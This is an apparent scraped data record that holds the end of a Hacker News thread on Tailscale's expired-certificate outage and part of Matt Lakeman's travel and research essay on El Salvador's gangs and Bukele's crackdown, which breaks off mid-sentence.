usually ends up being needed with 10-15 of these types of tasks is a simple, independent bpm workflow platform that tracks whether it happened or not.. or anything else. Learned this the hard way and won't do it any other way. reply c6400sc 10 hours agoparentprevA calendar alert is an automated alert, is it not?reply PuffinBlue 17 hours agoprevMigrating to a host that doesn’t support IPv6 when it’s important to you seems…like a bad decision. reply bradfitz 16 hours agoparentSuffice it to say neither their lack of IPv6 nor its importance to us was evenly understood throughout the company. reply PuffinBlue 14 hours agorootparentI very much enjoy the diplomatic phrasing of this statement :-) reply j45 14 hours agorootparentprevThis doesn't seem uncommon. Why learn IPv6 until you need to. I know it has some great features. reply lanthade 4 hours agoparentprevMy thoughts exactly. If feature X is important enough to do all the silly workarounds they did then why would you in the first place choose a provider that didn’t support feature X? The choice of IPV4 + shenanigans vs IPV6 seems pretty straightforward. reply speedgoose 11 hours agoparentprevIPv6 is important but step one is to remove the AAAA records. reply sowbug 17 hours agoprev [–] Two ideas for discussion. Certificate Transparency is used to account for maliciously or mistakenly issued certificates. Perhaps it could also be used to assert the unavailability of correctly issued but obsolete certificates that are believed to be purged but actually aren't. (Services like KeyChest might already do this.) Let's Encrypt is a miracle compared to the expensive pain of getting a cert 20 years ago. Rather than resting on laurels, would there be any benefit to renewing even more frequently, like daily? This might have confined the Tailscale incident to a quick \"oops!\" while the provider migration was still underway and being actively watched. reply striking 16 hours agoparent90 day renewal is frequent enough in my book. It's not so often as to be easy to miss, but often enough that the person setting it up can witness the first renewal cycle (if they so choose, which in this case they apparently did not). reply sowbug 14 hours agorootparentRight. I was thinking of keeping the same 90-day validity but renewing much more frequently, rather than the 60-day period that LE recommends. But I can see my questions have irked other community members, so I'll leave it at that. :) reply starttoaster 14 hours agoparentprev [–] I renew some of my LetsEncrypt certificates monthly, which should be plenty, in my opinion. Gets you about 2 buffer cycles to notice the certificate isn't updating and recognize an issue in your automation. reply pluto_modadic 8 hours agorootparent [–] is this a good amount of not overwhelming the system? e.g. they recommend 60 days? https://letsencrypt.org/2015/11/09/why-90-days - and folks say the bot process won't let you do it unless it's within 30 days of expiring? (but this might not be limited by the server-side API, because --force-renewal exists) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Tailscale.com faced a 90-minute outage on March 7, 2024, caused by an expired TLS certificate, affecting marketing materials and documentation only.",
      "The outage resulted from a misconfiguration hindering automatic certificate renewal, leading to site inaccessibility, prompting manual certificate renewals, infrastructure updates, and improved IPv6 support to avert future outages.",
      "Tailscale operations remained minimally affected by the outage, highlighting its resilience in facilitating direct machine-to-machine and service connectivity."
    ],
    "commentSummary": [
      "The discussion addresses the Tailscale.com outage due to expiring certificates, pricing debates, self-hosting challenges, IPv6 support issues, SSL certificate renewal problems, and DNS issues.",
      "Recommendations focus on enhancing security measures, team communication, and automating renewal processes for better network service efficiency.",
      "Emphasizing the significance of appropriate configuration, monitoring, and communication for ensuring network services' security and efficiency."
    ],
    "points": 217,
    "commentCount": 109,
    "retryCount": 0,
    "time": 1711812898
  },
  {
    "id": 39879432,
    "title": "El Salvador's Battle with Gang Violence and Government Tactics",
    "originLink": "https://mattlakeman.org/2024/03/30/notes-on-el-salvador/",
    "originBody": "Notes on El Salvador Published on March 30, 2024March 31, 2024 by Matt Lakeman In 1995, El Salvador had an intentional homicide rate of 139 per 100,000, the highest in the world and one of the highest rates recorded in modern history. Like all educated middle-class Americans, my core understanding of urban crime comes from The Wire, so for comparison, when the show took place, the homicide rate in Baltimore was in the high 30s and low 40s. The national US homicide rate peaked in 1980 at 10.2. The 2023 rate was about 5.5, which is very high for a wealthy Western country. Using data from the last few years, France, Germany, Italy, and Spain are all between 0.5-1.1. Japan and Singapore are at about 0.1-0.2. While the murder rate in El Salvador fell quickly after 1995, it remained the highest on average in the world across much of the following years, ranging between 40 and 107 from 2002 to 2018, typically beating out other highly murderous countries like Jamaica, Honduras, Belize, South Africa, the Bahamas, Brazil, Saint Lucia, Guatemala, and the Dominican Republic. As far as I can tell, the only country to match El Salvador’s murder rate in modern times was Colombia in the late 1980s and early 1990s during the height of the drug war against Pablo Escobar. But in 2023, El Salvador’s official murder rate dropped to 2.4 per 100,000, putting it in the league of Lithuania, Montenegro, and Canada. The rates of El Salvador’s neighbors, Guatemala and Honduras, remain 5-10X higher. Not far away, Jamaica holds the top spot in the world at about 50. El Salvador’s seemingly miraculous turnaround has been largely attributed to the efforts of President Nayib Bukele, who first took office in 2019 and launched possibly the most successful anti-crime crackdown in modern history. The country has been under quasi-martial law since 2022 and about 1.7% of the population is in prison. I traveled through El Salvador for nine days, stopping in San Salvador (the capital), Santa Ana, La Palma, and along the Ruta de Flores. I wanted to see for myself how much the country had changed, whether it really was safer, and to hear what Salvadorans thought of Bukele. Like Notes on the Ivory Coast, most of this essay is devoted to my research based on readings and talking to locals, but I’ll also write a bit about my travel experiences at the end. My major sources: Insight Crime has done a lot of great work on Latin America’s gangs and law enforcement policies. I read everything I could on its website, most importantly “El Salvador’s (Perpetual) State of Emergency: How Bukele’s Government Overpowered Gangs” from December 2023. Though Insight acknowledges the results of Bukele’s anti-crime efforts, it tends to be critical of Bukele in general. Some of my sources on pre-Bukele Salvadoran law enforcement strategies include Mo Hume’s “Mano Dura: El Salvador responds to gangs”, Robert Muggah and John de Boer’s “Mano Dura: the war on gangs,” and Sonja Wolf’s “Mano Dura: The Politics of Gang Control in El Salvador.” Maria Micaela Sviatschi’s “Spreading Gangs: Exporting US Criminal Capital to El Salvador” is the best explainer of the commonly held thesis that the American deportation of Salvadoran criminal immigrants inadvertently caused El Salvador’s gang problems. William Wheeler’s “State of War: MS-13 and El Salvador’s World of Violence” is a 3+ hour audiobook that gives a vivid description of the rise of El Salvador’s gangs. Similarly, I read Douglas Farah and Kathryn Babineau’s “The Evolution of MS 13 in El Salvador and Honduras.” They came out in 2020 and 2017 respectively, before the Bukele crackdown. This Congressional Research Services report from 2007 is also interesting, along with “Killers on a Shoestring Budget: Inside the Gangs of El Salvador.” I watched two interviews of Bukele: American Society/Council of the Americas in 2019 and Tucker Carlson in 2022. A key source on Bukele’s background is the New Yorker’s “The Rise of Nayib Bukele, El Salvador’s Authoritarian President.” Other important sources include this primer on Bukele’s Territorial Control Plan and this fact sheet on the Alliance for Prosperity. Other lesser sources are linked within. Overview Population (2021) – 6.3 million Population growth rate (2021) – 0.3% Size – 8,124 square miles (a little smaller than New Jersey, a little larger than Slovenia) GDP (nominal, 2021) – $35.3 billion (more than Cyprus) GDP growth rate (2022) – 2.6% GDP per capita (2023) – $5,557 GDP per capita PPP (2023) – $11,717 Inflation rate range (2018-2023) – -1%-7.5% (Note – El Salvador uses the US Dollar) Biggest export – Shirts and sweaters Median age (2023) – 27 Life expectancy (2020) – 71 Founded – 1824 Religion (2017) – 84% Christian (45% Catholic), 15% no religion Corruption Perceptions Index ranking (2022) – #116 Heritage Index of Economic Freedom ranking – #114 Rise of the Gangs What would eventually become the nations of El Salvador, Honduras, Nicaragua, Guatemala, and Costa Rica broke away from Spain in 1821, then immediately volunteered to join the Mexican Empire (Panama got independence at the same time but joined Colombia), and then they seceded from Mexico two years later as the Federal Republic of Central America. In 1841, the federation broke apart into its five constituent pieces mostly because the land area was too large, the geography too rough (with lots of mountains, jungles, and deserts), the people too divided, the government too weak, and everyone was too poor to make a grand military unification campaign worth the effort. After a brief civil war, the five states had a fairly similar and tumultuous history. They remained impoverished despite some meager economic investments from the US and Europe which drove agricultural production in bananas, coffee, sugar, indigo, and cocoa. Extreme economic inequality was prevalent, with a few powerful landowning families lording over a mass of peasants. Industry was meager-to-non-existent. The governments lurched between corrupt democracies and corrupt authoritarian dictatorships, usually with the backing of the local Catholic Church. Uprisings, civil wars, and border tussles were common throughout the next 100+ years, though at least not on the scale of the massive civil wars chronically breaking out to the north in Mexico. The one eventual exception to the chaos was Costa Rica, which became a peaceful and fairly prosperous democracy after some impressive statecraft in the 1940s. El Salvador’s government was marginally more stable than the others throughout this time due to the presence of a particularly strong oligarchy of wealthy families that shared power through the political system by alternating pre-ordained presidents through various forms of election rigging. Chronic peasant opposition and unrest became more intense in the 20th century as leftist ideologies took hold in the countryside. In 1931, the sham-democratic government was overthrown by the military which led a series of brutal crackdowns against leftist rural rebellions, with casualties reaching into the tens of thousands in single years. Leftist guerrillas fighting right-wing death squads became the norm. The dominance of the oligarchs remained in the background as various military governments reigned for almost the next 40 years. By the late 1970s, the military regime appeared to be on its last leg. The leftist opposition was increasingly well-organized (with financing from Cuba and the USSR) and was beginning to sway the Salvadoran masses against the blatantly corrupt military dictators. In 1977, the military had to lean on a comical level of fraud to win the national election, resulting in hundreds of thousands of Salvadorans flooding the streets to protest for democracy. The military killed hundreds in their efforts to disperse the mobs and the country was pushed another step closer to a breaking point. There was increasingly little faith on both the right and left for a peaceful resolution. In 1979, a different faction of the military, with significant oligarch support, overthrew the government in a coup and did away with the pretense of elections. The new government attempted a moderate path by maintaining military dominance but attempting some leftist land reforms. Fearing a complete government collapse and the rise of communism in its backyard, the United States embraced the new military regime and sent ample economic and military aid. But internally, the government struggled to maintain control of the country, and resorted to harsh measures that, yet again, led to the deployment of death squads and the murders of at least dozens of Salvadorans. Rightly or wrongly, US support was widely perceived as the primary reason the government managed to stay in power. A popular resistance leader emerged: Archbishop Oscar Romero. Though Catholic (which traditionally aligned with the conservative governments in the region), Romero opposed the military regimes. Leftists tried to claim him as their own, but Romero maintained that he was just an old school Christian who wanted to help the poor and not see protestors get slaughtered in the streets by death squads. He led mass protests through San Salvador and wrote a letter to President Jimmy Carter asking the US to cease support for the government. On March 24, 1980, Romero was shot and killed by a sniper while leading a march of tens of thousands of supporters. It’s not clear whether the government ordered the killing, or an aggressive right-wing faction took the initiative on its own, or if it was a Thomas Becket situation, but regardless, most people blamed the state. Romero’s funeral turned out hundreds of thousands of Salvadorans but tragically turned into another blood bath as multiple bombs went off and dozens were killed between the explosions and trampling. At least he got a really cool coffin. This is considered to be the catalyst for the El Salvador Civil War. Leftist forces organized into the Farabundo Marti National Liberation Front (FMLN), and with support from the Soviet Union and Cuba, they attempted a widespread armed uprising in the countryside to overthrow the government. The military government got even more support from the US, and bulked up both its official army and paramilitary death squads to put down the rebellion. Fighting lasted 11 or 12 years depending on when you want to date the start, and inflicted something like 80,000 dead (between military and civilian casualties) and more than half a million displaced. It was a classic insurgency – the military controlled the cities and bases, the rebels had the countryside. Both sides hit each other wherever they could, with activity often resembling terrorist attacks more than military engagements. Civilians were commonly targeted for supporting one side or the other, and entire villages were massacred. More than one million Salvadorans fled the country throughout the war (1980 population = 4.5 million). About half went to neighboring nations, though they were not particularly stable at the time. The rest went to the United States; from 1980 to 1990, the Salvadoran population in the US rose from 94,000 to 465,000. Immigrants tend to settle wherever their past countrymen settled, so most Salvadorans ended up in Los Angeles. Gangs of LA At the time, Salvadorans weren’t granted refugee status, so nearly all who fled to the US came as illegal immigrants through Mexico and had to eke out a living on the edge of the economy. They weren’t the poorest Salvadorans, who usually couldn’t afford to escape, let alone to the United States; rather they were the middle-to-lower-middle class of El Salvador, but that still made them very poor by American standards. They mostly settled in the impoverished suburbs of Los Angeles, where hundreds of thousands of other Salvadoran and Central American immigrants (both legal and illegal) were already living. They quickly got jobs where they could, nearly all in low-wage labor and retail. Very few spoke English, but with family support and hard work, they could get by. Arguably, the transition was even tougher on the children of these refugees. Many were grade schoolers or teenagers that were suddenly ripped from their homes and taken to a new, strange place to live. Others were born shortly after their mothers arrived and grew up in this environment. As with all refugee communities, women and children were far more prevalent than men, who were more likely to be involved in the fighting back home and targeted by violence. So the Los Angeles Salvadoran community was awash with single mothers, and even when the fathers were around, both parents usually had to work to financially support the family. Between that family dynamic and concerns over deportation preventing many of these children from going to school, tens of thousands of Salvadoran children found themselves with lots of free time in one of the more unsavory parts of the United States. Up to that point, Los Angeles was never quite Baltimore or St. Louis or Detroit with its gang violence, but it was pretty bad. Like everywhere else, LA gangs were largely oriented around a mixture of race, ethnicity, and geography. The black gangs were dominated by the Bloods and Crips, whose biggest rivals were Mexican gangs loosely affiliated with the Mexican Mafia (which consists mostly of Mexican-Americans), and there were also some Asian (mostly Korean) gangs thrown in. These groups battled each other for control of territory, mostly to distribute drugs shipped in from abroad, but also for extortion, petty criminality, and honor. These organizations didn’t look too kindly upon the newly arriving Salvadorans who were seen as poor and backwards even by Mexican and Central American gang members. Since neighborhoods tended to be racially segregated and the Salvadorans tended to live near other Hispanics, the Mexican gangs in particular harassed the Salvadorans. Dealing with extortion and arbitrary violence became normal for the refugees. One of the gangs under the Mexican Mafia was the 18th Street Gang, AKA Mara 18, or Barrio 18, or B-18, which was known for being highly progressive in regard to its membership. Unlike nearly every other gang at the time, B-18 allowed pretty much any Hispanic to join: Mexicans, Guatemalans, Hondurans, Nicaraguans, Hispanic Americans, and even Salvadorans. In every other possible way, B-18 was not progressive at all, and was known for conspicuous brutality and a predilection for murdering both enemies and those within its own ranks at the slightest provocation. But lots of bullied Salvadoran children and teenagers were grateful to receive some sort of protection from other gangs, so they joined existing B-18 chapters or formed their own, and the Salvadoran gang presence began to take hold. The most notorious Salvadoran gang has a murkier origin story. In the early 1980s, many Salvadoran middle and high schoolers adapted somewhat to American culture. They used their ample unsupervised time to smoke pot and rock out to heavy metal music. They grew their hair long, wore metal jewelry, and got tattoos illegally. After years of harassment from the Mexican gangs and B-18, some of these young men created their own gang: Mara Salvatrucha, better known as MS-13. It was initially born to protect these young Salvadorans but quickly evolved to challenge the other gangs for territorial control in Salvadoran neighborhoods. If you Google around, you’ll find a dozen different explanations for the name alone. Mara Salvatrucha might mean “long live El Salvador” or “watch out for Salvadorans” or “street smart Salvadoran gang” or it might be a reference to Salvadoran leftist guerrilla fighters or a particular street in El Salvador or the 13th letter in the alphabet, etc. There is far more consensus on the initial culture of MS-13, which adapted heavy metal aesthetics to gang warfare. MS-13 became associated with devil worship, which was a hot culture war issue at the time given the Satanic panic and the devout Catholicism of Latin Americans. Members would get tattoos of devil’s horns, 666, and other Satanic iconography. More substantially, MS-13 became known for its trademark weapon: the machete. In much of Latin America, the machete was and still is a fairly innocuous agricultural tool, though it is sometimes repurposed as a sidearm by guerrilla fighters. As far as I can tell, MS-13 is responsible for creating the image of the machete as a brutal weapon in the United States (ex. Machete). Early on, MS-13 consisted of a bunch of flat-broke teenagers who usually couldn’t get their hands on guns even in gun-ridden LA. Fists, knives, and baseball bats work fine, but the machete was not only a highly effective and commonly owned melee weapon, but also terrifying. If a rival gang member’s body was found on the street with gigantic incisions in his head, everyone in the neighborhood knew who killed him. Between blasphemous tattoos, rumors of demented Satan worship, and the very real acts of macheting people to death, MS-13 began to earn street cred in LA. They were considered particularly ferocious, quick to violence and murder, but also small-time. Even compared to the other gangs, MS-13 was a disorganized rabble consisting almost entirely of young, disaffected, uneducated, impoverished youth. New MS-13 members were initiated or “beat in” by other gang members by being mercilessly assaulted for 13 seconds (B-18 proudly beat their new members for 18 seconds). Individual gang cells arose spontaneously or with some support from existing members in new neighborhoods. Leaders of each local gang would collect all the money made by their group and distribute it among their gang underlings, but there was little coordination between the cells. It was more like a club rather than a hierarchical organization. Likewise, when MS-13 members weren’t macheting their rivals, they weren’t doing a whole lot else. They didn’t have the connections to tap into the drug game, nor the logistics for extortion, so what little money they made came from petty crime: burglaries, robberies, muggings, etc. In the mid-to-late 1980s, MS-13 began to develop what Sviatschi and criminologists call “criminal capital.” The education of MS-13 began on the streets just by interacting with (ie. usually fighting) other gangs. But most of this education happened in prisons where the older MS-13 members inevitably ended up. Behind bars, they parlayed with the most experienced and hardened members of other gangs, including plenty of individuals who could be considered part of gang middle-management. These MS-13 member students were usually still fairly young and early in their criminal careers and therefore could get shorter sentences, and when they were released from prison, they brought their newfound wisdom home to share. Thus, throughout the late 1980s and 1990s, MS-13 began to transform into more of a traditional street gang, particularly starting in 1990 when Ernesto Deres, an ex-special forces Salvadoran soldier with American training, took over the gang. A hierarchical structure was formed where individual gangs served under regional leaders who served under the top leaders. Money was kicked up and information and support was sent down. To generate income, petty criminality was subordinated for the consistent extortion of local businesses (ie. “pay my gang $500 per month or we’ll kill your whole family”). The heavy metal and Stanic iconography were somewhat sublimated, though tattooing continued to be the norm, with the quantities of tattoos emerging as a symbol of devotion to the gang, and therefore prestige. MS-13 still didn’t have too much involvement in drug trafficking, but it began extorting local dealers operating within their territory. https://www.thesun.co.uk/news/2387648/tattooed-members-el-salvador-ms-13-gang-prison-adam-hinton/ Another bit of murky gang lore is the origin of the war between MS-13 and B-18. The two were initially allies due to their Salvadoran link, but at some point in the late 1980s, the alliance broke down (possibly over a girl) and became one of the most legendary rivalries in gang history. The two gangs have been in a state of open warfare against each other for almost the entirety of the last 24+ years. A significant portion (most?) of the murders perpetrated by MS-13 and B-18 both in the US and El Salvador were and continue to be gang-on-gang violence over territory and honor. It’s worth reiterating that even after MS-13 began accumulating criminal capital, the vast majority of its membership consisted of literal children, or at least young adults. Individuals generally became affiliated with gangs when they were in middle school or younger when they would serve as look-outs and messengers. With a few years of service, they would be formally inducted into the gang around early high school age, or younger (research on MS-13’s operations in El Salvador in the 2010s found that 60% of members joined before age 15). The later high school or college age members were virtually all veterans or leaders, and rarely stayed out of prison for long. This youthful energy of MS-13 and similar gangs can partially explain their brutality, but also their attraction. These kids overwhelmingly came from broken homes, were ripped away from their homeland, were subject to abuse from rival gangs, and had (understandably) absentee parents. Gangs stepped in to fulfill the traditional roles of community and family. New members were told that any member would do anything for any other member, that they now had a place to live, money to spend, and a horde of defenders for any physical confrontation. Internal gang rules enforced pro-social norms such as prohibitions on heavy drinking/drugs or stealing girlfriends. Gang membership wasn’t just a job, it was a way of life, and a supposedly comforting one at that. Gone Home In 1992, the El Salvador Civil War came to an end. As far as these sorts of brutal civil wars in impoverished countries go, the United Nations-mediated truce between the rightist military government and the leftist FMLN rebels was fairly parsimonious. Most of the Salvadoran military was disbanded and new constitutional restrictions were put on their activity. The rebels laid down their arms and the FMLN reformed as a legitimate political party. An entirely new civilian police force was erected to be composed of a balance of former rightist and leftist soldiers. Elections had started in 1989 and were held again in 1994, this time between the FMLN and ARENA, an initially militant right wing party that had emerged during the civil war but had somewhat reformed into a bigger tent conservative faction. ARENA won in 1994, and despite plenty of grumbling about alleged election rigging, the FMLN settled into a peaceful opposition party role in a presidential democracy. The war was over but El Salvador was still in ruins. The vast majority of the population lived in abject poverty. Enormous efforts would need to be funded by international aid to rebuild villages and housing blocks. High birth rates had grown the native population to 5.5 million, but over a million Salvadorans remained outside the country. Though international support gave some optimism both at home and abroad, there were open questions as to how well the Salvadoran society could reabsorb tens of thousands of former soldiers into civilian work and possibly hundreds of thousands of returning immigrants, or whether El Salvador even should. Ultimately, the latter question wasn’t really up to El Salvador. In 1996, the Republican Congress under President Bill Clinton passed the Illegal Immigration Reform and Immigrant Responsibility Act (IIRIRA). American crime had just peaked in the early 1990s and anti-immigrant sentiment was flaring up, so bipartisan support arose for a new set of rules designed to combat both with harsher laws and more deportations, particularly of immigrants with criminal records. Thus, from 1998 to 2014, the United States deported 300,000 immigrants to Central America, tens of thousands of whom had criminal records. El Salvador was particularly impacted: From Sviatschi’s paper. Sviatschi’s thesis, which is commonly echoed by news articles, is that these deportations are the root of El Salvador’s and most of Central America’s ongoing gang and criminality problem. The argument goes that prior to the deportations, El Salvador had a meager organized crime presence consisting of very localized street gangs committing petty theft. There was also an international narco cartel presence in Central America, but they kept a very low profile while covertly moving product from South America to the US. The deportations then injected tens of thousands of citizens with criminal records, most of whom were gang-affiliated, into El Salvador. These Salvadorans not only brought their culture and criminal capital to El Salvador, but rapidly expanded the ranks of the gangs by recruiting from a population that was left impoverished and scarred by violence after over a decade of civil war. MS-13 and B-18 eventually became so powerful that they resembled parallel states within El Salvador, and their wanton violence is the root cause of the country’s notorious homicide rate. Wheeler’s report tells this story in more granular detail. Lots of the deportees were dumped at the San Salvador airport with no financial, logistical, or moral support, and so naturally drifted back to their hometowns, usually located in the particularly impoverished outskirts of major cities. Many of these deportees hadn’t been back to El Salvador since they were young children, and had to seek out distant family members who might give them a place to stay. With no education and no job prospects, re-joining or re-forming the American gangs in El Salvador was often the logical choice. Wheeler described one deportee and former gang member who within days of arriving in El Salvador was accosted by a group of young teenagers identifying themselves as MS-13 and threatening to kill him for being a member of B-18. The deportee then contacted some of his comrades back in the US who verified his membership with MS-13. The teenagers then apologized, admitted that they had never formally signed on with MS-13, and asked the gang member to beat them into membership. Other sources say that the gangs eventually stationed personnel in the airports to keep an eye out for any conspicuously tattooed people stepping off flights from America. A key factor in the proliferation of the gangs was the power vacuum in El Salvador. Even by the mid-2000s, the new civilian police force was still getting on its feet, and on its best days, it had nowhere near the funding, logistics, or technology of the LAPD to suppress gang activity. Likewise, with the military slashing its personnel and the leftist rebels retiring, El Salvador was awash with unemployed ex-soldiers and cheap weaponry. The civilian police force absorbed some of this, but many well-armed individuals found gang work palatable. Finally, unlike Mexico, Colombia, and later Peru and Ecuador, the giant narco cartels had yet to make serious inroads in Central America so there was no serious local gang competition. The meager street gangs of San Salvador, Santa Ana, and San Miguel were easily beaten and then absorbed by the better organized American gangs. By 2003, there were 25,000 gang members across all of Central America. That year, the criminal deportations from the US really started to ramp up. By 2004, estimates of gang membership in El Salvador alone were between 6,000 and 30,000. In 2016, arguably at the peak of their power, there were an estimated 60,000-70,000 gang members and maybe half a million collaborators, constituting 8% of the entire population. The gangs operated in 94% of municipalities, extorted 70% of businesses, and between the extortion, violence, and general instability promulgated by their presence, the gangs cost the Salvadoran economy an estimated $4 billion annually, constituting about 15% of GDP. In 2014, its most violent year, El Salvador suffered almost 4,000 murders. Gangs of El Salvador After the deportations, the activity of MS-13 and B-18 became more varied and widespread in El Salvador than back in the United States. This seems to be due to both the weakness of law enforcement in El Salvador compared to the US, and the lack of competition from stronger gangs (ie. the black and Hispanic gangs of LA). Yet the core of gang operations remained the same: extortion. Local chapters of MS-13 and B-18 took control of geographic areas and established protection rackets. Store owners were told that they needed to pay a daily, weekly, or monthly tax to the local gang or face violence against themselves and/or their families. A Salvadoran I talked to told me about how he set up a hostel in a small coastal city, and within days of opening, he was visited by a group of MS-13 members who demanded $250 per month. When the hostel owner initially refused, he was calmly informed that his entire family would be slaughtered imminently. He complied. Where the gangs in El Salvador and the US diverged is the extent of their control over territory. Wheeler described how many gangs became de facto governments. Gang territories were marked by omnipresent graffiti, usually huge murals of the numbers “13” or “18.” Gangs often set up checkpoints over their neighborhoods and forced anyone going in or out to pay a fee. All businesses within their territory, from branches of multi-national companies down to market stalls on the side of the road selling pupusas were forced to pay the gangs for “protection.” In 2016, the owner of a large bus company estimated that he paid the gangs $500,000 over the course of 19 years, but at the same time, daily extortion payments of $1 were not unheard of. Since calling the police for any reason at all became a capital offense against the gangs, the gangs themselves would often step into judicial roles and solve what should have been legal disputes. Sometimes these local gang leaders (who were nearly always teenagers) were surprisingly benevolent and fair in their judgements, and took an especially active role in crushing criminal incursions from non-gang members. But more often, these self-appointed dukes were arbitrary, cruel, and took what they wanted from whomever they wanted. A particular issue of concern was when a gang member decided to romantically/sexually pursue a local woman; “no” isn’t really a viable answer when the pursuer has the monopoly of violence on his side. (Incidentally, women could join MS-13 or B-18. They could choose to be “beaten in” like everyone else, or opt for a literal gang bang, though the latter option carried a stigma as the relatively easy path.) On the other hand, a Salvadoran mirror to American gang activity was that the leadership seemingly always ended up in jail. This is one of the most baffling elements of gang life to me as an oblivious outsider. Pablo Escobar may have been gunned down by the police but at least he got to live a billionaire lifestyle for almost a decade. In contrast, seemingly all top members of both MS-13 and B-18 end up incarcerated. This was the case even back in the 2000s when the Salvadoran government had completely lost control of the gang situation. No matter how wily the criminal, no matter how total his control over territory, the guys at the top of the hierarchy always ended up in a cell or dead. Despite chronically imprisoned leadership, the “criminal capital” of MS-13 and B-18 only improved after coming to El Salvador, likely due to a lack of law enforcement opposition and the influx of military veterans. Both MS-13 and B-18 developed official record-keeping, accounting, and hierarchical organization structures. Eventually, while continuing the never-ending war with each other, both gangs established diplomatic relationships with international narco gangs in Mexico and South America, through which they gained new valuable monetary sources by serving as muscle for the narcos when they shipped product through Central America. This proved to be so lucrative that the Honduran branch of MS-13 (which seems to operate quite independently) eventually stopped doing extortions entirely and now subsists on narco dollars. What do the gangs do with all their money? Of course, they pay their personnel, though the vast majority of members make peanuts. Most money seems to go toward criminal operational administration – bribes, legal fees, and generally trying to keep personnel alive and out of prison. As late as 2018, only one in 20 convictions of gang members resulted in jail time due to a combination of bribery and threats from the gangs. Prior to the 2022 crackdown, MS-13 was said to be burrowing moles into the police and even sending some of its smarter members to law school. Around this time, the gangs were also rapidly expanding their legitimate business assets with purchases of legal Salvadoran companies. A lot of the money went to the war. This is crucial to understanding why El Salvador has historically been, pardon my French, such a shit hole, and why harsh anti-gang measures have been so welcomed. MS-13 and B-18 weren’t just quasi-government entities in El Salvador, they were quasi-government entities at war that have turned much of El Salvador into a battlefield over the last 20 years. Some substantial portion of the killing was based on actual realpolitik objectives. Local MS-13 and B-18 gang chapters would target each other to take over territory and the protection rackets within it. Once conquered, the gangs would paint over the giant “13”’s or “18”’s, eliminate conspirators, and take root as the new overlords. But more often, the gang-on-gang violence was a lot less strategic. Gang members would try to kill each other opportunistically, or because an individual member wandered into the wrong neighborhood, or simply as a way for an individual gang member to boost his street cred. Supposedly, at some point, the memberships of MS-13 and B-18 were so oversaturated that the gangs began to initiate tougher induction rituals, including the requirement that new members kill someone, usually a member of the rival gang. Gang members killing each other is one thing, but killing civilians is another thing entirely. I wish I could find a numerical breakdown, but my sense is that the gangs killed innocents at least as often as each other. Non-gang members could be killed for refusing to pay extortion fees, for disrespect, or by bad luck for being caught in the crossfire of some sort of dispute. If the root-cause of the gang war is now pretty much lost to history, then why was so much blood been spilled between MS-13 and B-18 over 20+ years? Why did these gangs terrorize an entire country, resulting in the deaths of tens of thousands and an annual double-digit percentage drag on GDP? What was it all for? A knee-jerk response to these questions is money, and that’s almost entirely wrong. There was shockingly little money at stake in the Salvadoran gang wars. Fighting for Scraps In 2016, Salvadoran newspaper El Faro and the New York Times got access to documents from the government of El Salvador that estimated the annual revenue of the El Salvador branch of MS-13 to be… $31.2 million. Which, divided among its estimated 40,000 members, was $65 per person/per month, or $15 per person/per week. Which was half the minimum wage for an agricultural day-laborer in El Salvador. But the vast majority of Salvadoran gang members don’t even make $15 per week, at least not from gang payments. Most members basically work for no salary at all, or at best, they get occasional parties or petty cash. I guess you could say that their payments from the gangs are purely in the form of intangible protection, respect, and honor. They survive by parlaying their gang status into small side-hustles, like maintaining their own off-the-books extortion rackets, either on top of the official rackets, or on otherwise untouched businesses. So maybe the rank-and-file mass members don’t make money from the gang life, but at least the leaders must be unfathomably rich. Right? Probably not. There is a strong norm within the gangs prohibiting the leaders from getting too wealthy. At best, they use their positions to escape poverty for the middle class and maybe buy a few toys. The same report looked at the results of a successful government raid that captured numerous high-ranking MS-13 members and their assets. These included $34,500 in cash, 22 used cars (valued at $8,000 each), and three small businesses (a bar, a roadside restaurant, and a vegetable stand). One of the highest-ranking members of MS-13 “leased a squat concrete house with a corrugated roof in a neighborhood where rents rarely reach $400. He owned an old Honda Civic and a Nissan van.” The overall impression of MS-13 from the report is that it is a remarkably petty, small-time operation compared to its outsized reputation. For instance: “Over a decade ago, the police confiscated an account ledger from José Luis Mendoza Figueroa, a founder of MS-13, that contained no evidence of any drug business. Instead it showed weekly receipts that averaged $14 from the 19 “cliques” — the smallest gang units — he controlled, and trivial outlays for bullets ($8), taxis ($25), Christmas dinners, liquor and “$50 for the homeboys in prison.” A couple of years ago, federal agents seized a similar ledger from the treasurer of the Park View Locos clique of the MS-13 in Usulután in southeast El Salvador. A log of one day’s expenses showed $30 for a cellphone chip, $10 for “mujer chief” (the chief’s wife or woman), $35 for “another woman” and $10 for food, with $29 listed as the balance.” This is one of my biggest takeaways from learning about El Salvador. Mexico, Columbia, Ecuador, Bolivia, and Peru have narco gangs. These organizations are based around the production and sale of extremely valuable commodities, and thus the narco gangs can reach annual revenues on the scale of Fortune 500 companies. This financing translates into firepower and influence that enables them to not only resist their governments, but even eclipse them at times. As of writing this, Ecuador is in a state of near-civil war as it battles its own drug gangs. El Salvador’s MS-13 and B-18 are not in the same league. Their bread-and-butter is extorting poor people in an impoverished country. Their expertise is localized brutality rather than transnational business. The narco gangs would annihilate the Salvadoran gangs in any fair fight. But all this begs the question… Why Are Salvadoran Gangs so Dangerous? If Salvadoran gangs have shockingly little money, why are they so dangerous? Over the last 20 years, MS-13 and B-18 have made El Salvador probably the most dangerous country on earth that isn’t an insane totalitarian hell hole or in an actual war. MS-13 is basically a household name in the US now, partially due to their association with illegal immigrants promoted by President Trump and other Republicans. In contrast, Americans rarely hear anything anymore about the Colombian or Peruvian drug cartels even though their annual earnings are at least 10X more than El Salvador’s gangs. We hear a lot about Mexican Cartels, but usually not specific organizations, and despite their best efforts, Mexico is actually doing quite well these days. The Italian Mafia and Japanese Yakuza may be legendary and both still exist, but are a pale shadow of their former selves. So what’s special about Salvadoran gangs? How were they able to thoroughly destroy a nation and gain international notoriety on such a paltry budget? (WARNING – PURE SPECULATION AHEAD) I think what makes El Salvador’s gangs so dangerous is their weakness. Their low earnings and lack of organization perversely make them more dangerous to civilians and other gangs than the far better financed and organized international drug cartels. Imagine that all organized criminal groups exist on a spectrum between devotion to commerce and honor. Gangs on the far end of one side of the spectrum operate exactly like a business that just so happens to service and elicit market; they don’t engage in violence except as a measure of last resort to protect profits. Gangs on the extreme opposite side of the spectrum barely or don’t care about money at all; they are focused on respect, both for the gang as a whole and the individuals within them. For example, at the height of the Colombian drug trade, the nation was dominated by two cartels based out of the cities of Medellin and Cali. Famously, Pablo Escobar’s Medellin Cartel was more respect-oriented than the “Gentleman of Cali.” Both organizations were monstrous and killed thousands of people, but Cali was said to run 